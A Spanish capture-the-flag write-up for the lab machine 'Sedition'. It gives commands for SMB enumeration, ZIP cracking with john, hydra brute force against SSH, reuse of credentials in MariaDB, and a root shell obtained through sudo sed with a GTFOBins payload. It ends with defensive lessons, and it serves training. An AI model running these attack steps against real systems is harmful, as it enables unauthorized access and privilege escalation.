# Sedition

<img width="1350" height="634" alt="image" src="https://github.com/user-attachments/assets/7f0ce5b0-432a-4d16-ba3f-cd0f51f716c0" />

 **Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 29/07/2026
 
## 0. Resumen
 
Máquina Linux fácil centrada en enumeración SMB, cracking de contraseñas y reutilización de credenciales
 
El camino de explotación combina:
- Acceso anónimo a un recurso SMB con un archivo comprimido protegido por contraseña
- Cracking de la contraseña del ZIP
- Identificación del usuario SSH mediante fuerza bruta inversa (contraseña conocida, usuario desconocido)
- Reutilización de credenciales entre SSH y MariaDB
- Escalada a root abusando de `sed` con permisos sudo (GTFOBins)
  
## 1. Reconocimiento

   Ping
   
```bash
ping -c 2 <IP>
```

<img width="1249" height="125" alt="image" src="https://github.com/user-attachments/assets/80809c6b-9c85-4348-853f-4ea73a35e07f" />

→ TTL=64 sugiere que se trata de un host Linux

   Nmap
 
```bash
nmap -p- --open -sCV -Pn -n --min-rate 5000 <IP> -oA sedition
```
 
| Orden | Función |
|---|---|
| `-p-` | Escanea todos los puertos (65535), para no descartar servicios en puertos no estándar |
| `--open` | Muestra únicamente puertos abiertos |
| `-sCV` | Ejecución de scripts básicos y detección de versión de servicios |
| `-Pn` | Omite descubrimiento de host (evita falsos negativos si el host filtra ICMP) |
| `-n` | Sin resolución de DNS, para agilizar el escaneo |
| `--min-rate` | Acelera el escaneo forzando el envío de 5000 paquetes/segundo |
| `-oA` | Output en todos los formatos (.nmap, .xml, .gnmap) |
 
**Resultados:**
 
- Puerto 139/445: Samba smbd 4
  
- Puerto 65535: OpenSSH 9.2p1 (Debian 12)
  
El SSH en un puerto no estándar (`65535`) justifica revisar bien el rango completo de puertos con `-p-` en lugar de limitarse a los 1000 puertos iniciales
 
## 2. Enumeración SMB
 
### 2.1 Listado de recursos compartidos
 
```bash
nxc smb <IP> -u '' -p '' --shares
```

| Orden | Función |
|---|---|
| `-u '' -p ''` | Sesión anónima (sin credenciales), para comprobar si SMB permite listar recursos sin autenticación |
| `--shares` | Lista los recursos compartidos disponibles |

<img width="1348" height="171" alt="image" src="https://github.com/user-attachments/assets/2aea3d36-9229-4e35-a4be-f979f387d0f6" />
 
→ Se identifica el recurso `backup`, accesible sin autenticación
 
### 2.2 Acceso al recurso `backup`
 
```bash
smbclient //<IP>/backup -N
```
 
| Orden | Función |
|---|---|
| `-N` | Fuerza sesión nula (sin contraseña), coherente con el acceso anónimo detectado en el paso anterior |

<img width="1097" height="105" alt="image" src="https://github.com/user-attachments/assets/b6fe57e6-8273-4f17-aa91-9d2dbd35caca" />

Dentro del recurso se encuentra el archivo `secretito.zip`, que se descarga
 
```bash
get secretito.zip
```
 
## 3. Análisis y cracking del ZIP
 
El archivo está protegido por contraseña. Se extrae el hash de la protección para poder atacarlo por diccionario:
 
```bash
zip2john secretito.zip > hash_secretito.zip.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash_secretito.zip.txt
```
 
| Orden | Función |
|---|---|
| `zip2john` | Convierte la protección del ZIP en un hash compatible con John the Ripper |
| `--wordlist` | Ataque de diccionario contra el hash, usando `rockyou.txt` por tratarse de una contraseña probablemente débil/común |

→ Contraseña obtenida `sebastian`. Se descomprime el archivo
 
```bash
unzip secretito.zip
```

Dentro solo hay un archivo llamado `password`, que contiene la contraseña `elbunkermolagollon123` sin usuario asociado. Esto condiciona el siguiente paso, ya que hay que averiguar a qué cuenta corresponde
 
## 4. Acceso inicial — Fuerza bruta de usuario
 
Al tener la contraseña pero no el usuario, se invierte el ataque de fuerza bruta habitual: se fija la contraseña y se prueba contra un diccionario de nombres de usuario
 
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p elbunkermolagollon123 ssh://<IP>:65535 -t 64
```
 
| Orden | Función |
|---|---|
| `-L` | Diccionario de nombres de usuario a probar |
| `-p` | Contraseña fija ya conocida (obtenida del ZIP) |
| `ssh://<IP>:65535` | Se apunta al puerto no estándar detectado en el nmap |
| `-t` | Número de tareas simultáneas, para acelerar el ataque |

<img width="1200" height="102" alt="image" src="https://github.com/user-attachments/assets/d4f93ce8-2954-411e-92d3-557f328d6d2b" />
 
→ Usuario válido identificado: `cowboy`
 
```bash
ssh cowboy@<IP> -p 65535
```
 
## 5. Post-explotación
 
### 5.1 Revisión del historial de comandos
 
```bash
history
```

<img width="1228" height="86" alt="image" src="https://github.com/user-attachments/assets/c77d0c7c-5fdb-4561-8e45-3b5bf14d3b90" />

→ El historial contiene credenciales de acceso a MariaDB. Revisar `~/.bash_history` tras cualquier acceso inicial es un paso estándar, ya que es habitual encontrar comandos con contraseñas en claro o rutas sensibles
 
### 5.2 Acceso a la base de datos
 
```bash
mariadb -u cowboy -pelbunkermolagollon123
```

Las credenciales de MariaDB coinciden con las de SSH, lo que confirma reutilización de contraseñas entre servicios
 
### 5.3 Enumeración de bases de datos y extracción de credenciales
 
```sql
SHOW DATABASES;

USE bunker;

SHOW TABLES;

SELECT * FROM users;
```

<img width="1020" height="103" alt="image" src="https://github.com/user-attachments/assets/0ce21563-8ba6-46b7-ac37-beccd8072e86" />

→ La tabla `users` de la base de datos `bunker` contiene un hash MD5

Se identifica el algoritmo por su longitud (32 caracteres hexadecimales = 128 bits) y se crackea con diccionario o con un servicio como CrackStation

<img width="1018" height="324" alt="image" src="https://github.com/user-attachments/assets/ed58f216-a7a0-4701-9138-b1dd164b8f0d" />

→ Se obtienen las credenciales del usuario `debian : password1`
 
```bash
su debian
```
 
## 6. Escalada de privilegios
 
### 6.1 Enumeración de privilegios sudo
 
```bash
sudo -l
```
 
→ El usuario `debian` puede ejecutar `sed` como root sin contraseña. Cualquier binario permitido en `sudo -l` debe comprobarse contra GTFOBins antes de descartarlo como "inofensivo"

<img width="851" height="245" alt="image" src="https://github.com/user-attachments/assets/7067f86c-07ea-4b35-b6dd-685284b5fe7f" />

## 7. Escalada a root - Explotación de `sed` (GTFOBins)
 
```bash
sudo -u root /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
```
 
| Orden | Función |
|---|---|
| `-n` | Suprime la salida automática de `sed`, para que solo se ejecute el comando indicado |
| `1e exec sh 1>&0` | En la línea 1 del archivo, ejecuta `exec sh` mediante el comando `e` de `sed` y redirige la salida a la entrada estándar, entregando una shell interactiva |
| `/etc/hosts` | Archivo cualquiera legible, usado solo como argumento válido para que `sed` se ejecute |
 
→ Se obtiene una shell como root
 
## 7.1 Primera flag (debian)

```bash
cat /home/debian/flag.txt
```

## 7.1 Segunda flag (root)

```bash
cat /root/root.txt
```

## 8. Lecciones aprendidas

<img width="1173" height="538" alt="image" src="https://github.com/user-attachments/assets/ba531e72-4015-46b2-a511-c285051fb95b" />

- El acceso SMB anónimo permite enumerar y descargar archivos sensibles, por lo que los recursos compartidos deben auditarse incluso sin credenciales
  
- Las contraseñas de diccionario, incluso dentro de un ZIP, caen rápido frente a `john` + `rockyou.txt`
  
- Reutilizar credenciales entre servicios (SSH y MariaDB) multiplica el impacto de una sola fuga
  
- MD5 no es válido para almacenar contraseñas. Cualquier hash de 32 caracteres hexadecimales debe tratarse como comprometido
  
- `sudo -l` es obligatorio tras cualquier acceso, y GTFOBins es la referencia para comprobar si un binario permitido puede usarse para escalar privilegios
